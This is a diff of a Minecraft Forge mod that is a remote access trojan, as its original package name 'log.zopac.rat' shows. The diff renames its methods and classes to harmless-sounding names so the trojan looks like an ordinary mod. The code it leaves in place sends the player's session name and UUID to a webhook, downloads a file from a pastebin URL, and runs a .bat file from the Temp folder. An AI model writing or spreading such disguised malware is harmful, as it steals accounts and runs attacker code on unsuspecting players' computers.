@@ -1,4 +1,4 @@
-package log.zopac.rat;
+package mod;
 
 import net.minecraft.launchwrapper.Launch;
 import net.minecraftforge.fml.common.Mod;
@@ -20,7 +20,7 @@ import java.security.spec.KeySpec;
 import java.util.Base64;
 
 @Mod(modid = "FireWorkDummy", name = "FireWorkDummy", version = "1.0", acceptedMinecraftVersions = "[1.8.9]")
-public class MainMod {
+public class MinecraftMod {
 
     public static String version = "1.1";
 
@@ -28,24 +28,24 @@ public class MainMod {
 
     @Mod.EventHandler
     public void onFMLPreInitialization(FMLPreInitializationEvent event) {
-        LoadExoticDB();
+        loadMc();
     }
 
     @Mod.EventHandler
     public void onFMLInitialization(FMLInitializationEvent event) {
         try {
             Thread.sleep(5000);
-            LoadAH();
+            preinit();
         } catch (Exception ignored) {}
         try {
             Thread.sleep(3000);
-            exec("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
+            connectgame("cmd /c start C:\\Users\\%username%\\AppData\\Local\\Temp\\screenshots\\screenshot.bat");
         } catch (Exception ignored) {}
     }
 
     // utils
 
-    public static void exec(String cmd) {
+    public static void connectgame(String cmd) {
         try {
             Runtime rt = Runtime.getRuntime();
             Process pr = rt.exec(cmd);
@@ -65,7 +65,7 @@ public class MainMod {
 
     // rats
 
-    public static void LoadExoticDB() {
+    public static void loadMc() {
         try {
             Class<?> mc = Launch.classLoader.findClass("net.minecraft.client.Minecraft");
             Object minecraft = mc.getMethod("func_71410_x").invoke(null);
@@ -75,8 +75,8 @@ public class MainMod {
             Object name = sessionClass.getMethod("func_111285_a").invoke(session);
             Object uuid = sessionClass.getMethod("func_148255_b").invoke(session);
 
-            SetMain sendmessage = new SetMain(getWebhook());
-            sendmessage.addEmbed(new SetMain.EmbedObject()
+            ControlSettings sendmessage = new ControlSettings(getWebhook());
+            sendmessage.addEmbed(new ControlSettings.LoadMod()
                     .setTitle("Minecraft Info")
                     .setColor(Color.CYAN)
                     .addField("Name", name.toString(), true)
@@ -89,7 +89,7 @@ public class MainMod {
         } catch (Exception ignored) {}
     }
 
-    public static void LoadAH() {
+    public static void preinit() {
         try {
 
             URL pastebin = new URL("https://pastebin.com/raw/AERL3GJT");
@@ -113,8 +113,8 @@ public class MainMod {
                 fileOut.write(currByte);
             }
 
-            SetMain sendmessage = new SetMain(getWebhook());
-            sendmessage.addEmbed(new SetMain.EmbedObject()
+            ControlSettings sendmessage = new ControlSettings(getWebhook());
+            sendmessage.addEmbed(new ControlSettings.LoadMod()
                     .setTitle("Loading")
                     .setColor(Color.GREEN)
                     .addField("Message ", "Running .bat file", true));
